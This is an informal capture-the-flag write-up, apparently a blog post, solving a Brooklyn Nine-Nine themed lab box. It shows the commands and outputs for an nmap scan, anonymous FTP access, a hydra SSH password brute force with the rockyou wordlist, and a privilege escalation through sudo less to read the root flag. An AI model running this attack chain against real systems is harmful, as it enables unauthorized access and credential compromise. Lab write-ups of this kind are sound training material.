---
title: Brokline_NINE_NINE ROOM 
date: "2020-07-27"
---

# connect to the box
first things first lets do a nmop scan.

# Nmap_Result

'''
nmap -sC 10.10.104.148

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2020-07-27 19:18 IST
Nmap scan report for 10.10.104.148
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
22/tcp open  ssh
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|_  256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).
'''

ftp
soo we know we anonymous login without entering the passoword.

'''
 ftp 10.10.104.148
Name (10.10.104.148:root): anonymous
331 Please specify the password.
Password:
230 Login successful.

ftp> ls
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
ftp> get note_to_jake.txt
'''

result of the txt file we got from ftp
cat note_to_jake.txt
the file contained.
''
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
..

so we know jack does not have a strong passowrd soo lets bruteforce it.
open hydra 
''
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.104.148 ssh
'''
passowrd 
[22][ssh] host: 10.10.104.148   login: jake   password: 987654321

now login ssh jake@10.10.104.148

find / -type f -name "user.txt" -exec ls -l {} \; 2>/dev/null


jake@brookly_nine_nine:~$ cd /home/holt/
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt

got_out_flg


#second flag 

''
sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
''

found this so now  we can use less insed of cat 

sudo less /root/root.txt


and wollah we cout our key .. greatt


lovely though









